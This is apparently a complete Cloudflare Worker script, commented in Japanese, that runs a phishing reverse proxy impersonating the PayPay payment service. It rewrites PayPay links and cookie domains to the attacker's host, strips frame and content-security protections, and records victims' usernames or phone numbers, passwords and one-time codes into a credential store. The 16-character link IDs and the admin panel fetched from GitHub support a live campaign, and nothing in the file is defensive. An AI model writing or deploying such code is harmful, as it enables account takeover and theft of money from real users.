// Cloudflare Worker — reverse proxy to PayPay + credential store
// KV binding: CREDS
// /admin で元の管理画面を配信
// 16文字IDパスは PayPay ログインにプロキシ

const TARGET_ORIGIN = "https://www.paypay.ne.jp";
const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
const ADMIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/admin.html";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const workerHost = url.host;

    if (url.pathname === "/admin" || url.pathname === "/admin.html") {
      try {
        const adminRes = await fetch(ADMIN_SOURCE);
        if (adminRes.ok) {
          return new Response(await adminRes.text(), {
            headers: { "Content-Type": "text/html; charset=utf-8" },
          });
        }
      } catch {}
      return new Response("Admin HTML fetch failed", { status: 502 });
    }

    const secret = (env.SECRET || "").trim();
    if (secret && request.headers.get("X-Secret") === secret && request.method === "POST") {
      return handleStore(request, env);
    }

    const pathParts = url.pathname.split("/").filter(Boolean);
    if (pathParts.length === 1 && LINK_ID_RE.test(pathParts[0])) {
      const loginUrl = new URL(request.url);
      loginUrl.pathname = "/app/account/logout";
      loginUrl.search = "?redirect=%2Fapp%2Faccount%2Fsign-in";
      return proxy(new Request(loginUrl, request), env, workerHost);
    }

    return proxy(request, env, workerHost);
  },
};

async function proxy(request, env, workerHost) {
  const url = new URL(request.url);
  const targetUrl = TARGET_ORIGIN + url.pathname + url.search;

  const headers = new Headers(request.headers);
  headers.set("Host", "www.paypay.ne.jp");
  headers.delete("cf-connecting-ip");
  headers.delete("cf-ray");
  headers.delete("cf-visitor");

  let body = request.body;

  if ((request.method === "POST" || request.method === "PUT") && url.pathname.includes("/oauth/token")) {
    const clone = request.clone();
    try {
      const text = await clone.text();
      body = text;
      let parsed = {};
      try { parsed = JSON.parse(text); } catch {
        const params = new URLSearchParams(text);
        for (const [k, v] of params) parsed[k] = v;
      }
      const captured = {
        type: "oauth_token",
        path: url.pathname,
        grant_type: parsed.grant_type || null,
        username: parsed.username || parsed.phone || null,
        password: parsed.password || null,
        otp: parsed.otp || null,
        raw: text.slice(0, 1500),
        ts: new Date().toISOString(),
      };
      const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
      await env.CREDS.put(key, JSON.stringify(captured));
    } catch {}
  }

  const res = await fetch(targetUrl, {
    method: request.method,
    headers,
    body: (request.method !== "GET" && request.method !== "HEAD") ? body : undefined,
    redirect: "follow",
  });

  const newHeaders = new Headers(res.headers);
  newHeaders.delete("content-security-policy");
  newHeaders.delete("x-frame-options");

  const setCookies = newHeaders.getAll("set-cookie") || [];
  newHeaders.delete("set-cookie");
  for (const c of setCookies) {
    const rewritten = c
      .replace(/Domain=[^;]+/gi, `Domain=${workerHost}`)
      .replace(/domain=[^;]+/gi, `domain=${workerHost}`);
    newHeaders.append("set-cookie", rewritten);
  }

  const contentType = newHeaders.get("content-type") || "";
  if (contentType.includes("text/html") || contentType.includes("javascript") || contentType.includes("css")) {
    let text = await res.text();
    // すべての paypay.ne.jp サブドメインを Worker ドメインに書き換え
    text = text.replace(/https?:\/\/[^"'\s]*paypay\.ne\.jp/g, (m) =>
      m.replace(/https?:\/\/[^/]*paypay\.ne\.jp/, `https://${workerHost}`)
    );
    return new Response(text, { status: res.status, headers: newHeaders });
  }

  return new Response(res.body, { status: res.status, headers: newHeaders });
}

async function handleStore(request, env) {
  let body;
  try { body = await request.json(); } catch { body = {}; }
  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
  await env.CREDS.put(key, JSON.stringify(body));
  return json({ ok: true, key });
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data, null, 2), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}
